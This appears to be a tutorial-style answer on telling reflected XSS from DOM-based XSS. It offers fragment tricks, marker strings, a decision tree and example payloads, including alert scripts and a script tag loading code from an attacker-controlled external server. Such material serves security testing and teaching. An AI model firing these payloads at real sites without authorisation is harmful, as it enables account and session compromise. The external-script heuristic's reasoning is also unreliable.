> 🕵️‍♂️ "If I input a payload into a URL, and I see a popup... how can I tell whether it's Reflected XSS or DOM-Based XSS **without digging into request/response details**?"

### ✅ TL;DR:

> **You can’t *always* tell just from the output (like an alert).**
> But there are smart tricks you can use to **infer** whether it's reflected or DOM-based — even in black-box testing — **before opening DevTools**.

## 🔍 Heuristics to Tell the Type (Without Looking at Requests Yet)

Here are the practical strategies:

---

### 🔸1. **Change the URL Fragment (`#`) Only**

Try this:

```
https://victim.com/page#<script>alert(1)</script>
```

* **If the XSS fires**, it’s **DOM-based**, because:

  * The **`#fragment` is never sent to the server**.
  * Only JavaScript running in the browser can read it.

✅ So this is a clean trick: **If XSS works with only a hash**, it's **DOM XSS.**

---

### 🔸2. **Inject with a Unique Marker (e.g. `XSS123`)**

Use:

```
https://victim.com/page?q=XSS123
```

Then search the **raw HTML source** (`Ctrl+U` or View Source):

* If you **see `XSS123` in the page source**, then it's **reflected by the server** → **Reflected XSS**.
* If not, but it still appears in the rendered DOM, then it’s likely **inserted by client-side JavaScript** → **DOM XSS**.

---

### 🔸3. **Use a Time Delay or External Payload**

Try this payload:

```html
<script src="https://your-server.com/xss.js"></script>
```

* If your server logs a hit (even before you interact with the page), it suggests the **server embedded your script tag** → **Reflected XSS**.
* If the hit only comes after the page renders and JS runs → could be **DOM-based**.

---

### 🔸4. **Use Browser DevTools to Observe Live DOM Manipulation**

You said *without inspecting requests*, but if you open DevTools:

* Look at **Network → Doc** and check the **initial HTML**.
* Then compare it to the **live DOM (Elements tab)**.
* If payload is not in the HTML response but appears in DOM → DOM-based XSS.

### ✅ Quick Decision Tree

```plaintext
             +-- Does payload work in #fragment? --> Yes --> DOM XSS
             |
User input --+
             |
             +-- Is payload in raw HTML source? --> Yes --> Reflected XSS
                                               --> No  --> Probably DOM XSS
```

---

## 🧪 Final Tip: Use Custom Payloads That Break Differently

Try:

```html
"><svg/onload=alert(1)>
```

Some payloads might be **sanitized by the server but not JS**, or vice versa — different behavior gives clues.
